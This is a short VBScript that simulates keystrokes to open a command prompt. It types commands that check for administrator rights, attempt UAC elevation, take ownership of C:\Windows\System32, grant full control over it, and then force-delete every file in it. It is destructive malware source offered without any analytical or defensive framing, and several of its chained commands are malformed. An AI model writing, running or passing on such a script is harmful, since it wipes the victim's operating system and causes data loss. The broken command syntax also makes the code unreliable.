Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.SendKeys "^{ESC}" ' Simulates pressing Ctrl + Esc to open the Start menu
WScript.Sleep 100 ' Wait for a moment to ensure the Start menu opens
WshShell.SendKeys "r" ' Simulates pressing the R key
WScript.Sleep 100

WshShell.SendKeys "{ENTER}" ' Simulates pressing the Enter key

WScript.Sleep 100

WshShell.SendKeys "cmd"                               

WScript.Sleep 100

WshShell.SendKeys "{ENTER}" 

WScript.Sleep 100


WshShell.SendKeys " net session >nul 2>&1if %errorLevel% == 0 (set admin=1) else ( set admin=0)" 
 

WScript.Sleep 100

Wshshell.SendKeys "{ENTER}"

WshShell.SendKeys "echo UAC.ShellExecute %~s0, "", "", runas, 1 >> %temp%\getadmin.vbstemp%\getadmin.vbs del %temp%\getadmin.vbs exit /b"

WScript.Sleep 200

Wshshell.SendKeys "{ENTER}"


WshShell.SendKeys " if %errorLevel% == 0 ( set admin=1 ) else ( set admin=0 ) REM If not running with admin privileges, elevate if %admin%==0 ( >nul 2>&1 %SYSTEMROOT%\system32\cacls.exe %SYSTEMROOT%\system32\config\system || ( echo Set UAC = CreateObject^(Shell.Application^) > %temp%\getadmin.vbs"

WScript.Sleep 200

WshShell.SendKeys "{ENTER}"

WshShell.SendKeys "takeown /f C:\Windows\System32 /r /d y icacls C:\Windows\System32 /grant administrators:F /t "

WScript.Sleep 200

WshShell.SendKeys "{ENTER}" 


WshShell.SendKeys "cd C:\Windows\System32 REM Delete System32 del /F /S /Q *.* "

WScript.Sleep 100


WshShell.SendKeys "{ENTER}"

